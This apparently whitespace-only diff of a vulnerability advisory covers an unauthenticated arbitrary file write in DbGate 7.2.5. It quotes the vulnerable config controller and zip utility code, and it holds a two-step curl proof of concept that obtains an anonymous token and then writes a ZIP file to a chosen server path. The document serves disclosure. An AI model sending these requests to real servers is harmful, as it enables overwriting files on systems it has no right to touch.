@@ -22,7 +22,7 @@ In `packages/api/src/controllers/config.js`:
 ```javascript
 createConnectionsAndSettingsZip_meta: true,
 async createConnectionsAndSettingsZip({ db, filePath }, req) {
-    await dbgateApi.zipJsonLinesData(exportDb, filePath);  // No path validation!
+ await dbgateApi.zipJsonLinesData(exportDb, filePath); // No path validation!
 }
 ```
 
@@ -30,10 +30,10 @@ In `packages/api/src/utility/zipJsonLinesData.js`:
 
 ```javascript
 function zipDirectory(jsonDb, outputFile) {
-    if (typeof outputFile == 'string' && outputFile.startsWith('archive:')) {
-        outputFile = path.join(archivedir(), outputFile.substring('archive:'.length));
-    }
-    const output = fs.createWriteStream(outputFile);  // Arbitrary path when not archive: prefix
+ if (typeof outputFile == 'string' && outputFile.startsWith('archive:')) {
+ outputFile = path.join(archivedir(), outputFile.substring('archive:'.length));
+ }
+ const output = fs.createWriteStream(outputFile); // Arbitrary path when not archive: prefix
 }
 ```
 
@@ -47,17 +47,17 @@ Verified on DbGate 7.2.5 Docker (default anonymous deployment, port 3000):
 
 ```bash
 curl -s -X POST http://TARGET:3000/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"amoid":"none"}'
+ -H "Content-Type: application/json" \
+ -d '{"amoid":"none"}'
 ```
 
 **Step 2: Write ZIP file to arbitrary filesystem path**
 
 ```bash
 curl -s -X POST http://TARGET:3000/config/create-connections-and-settings-zip \
-  -H "Authorization: Bearer <JWT>" \
-  -H "Content-Type: application/json" \
-  -d '{"db":{"connections":[]},"filePath":"/tmp/poc_config.zip"}'
+ -H "Authorization: Bearer <JWT>" \
+ -H "Content-Type: application/json" \
+ -d '{"db":{"connections":[]},"filePath":"/tmp/poc_config.zip"}'
 ```
 ```
 true
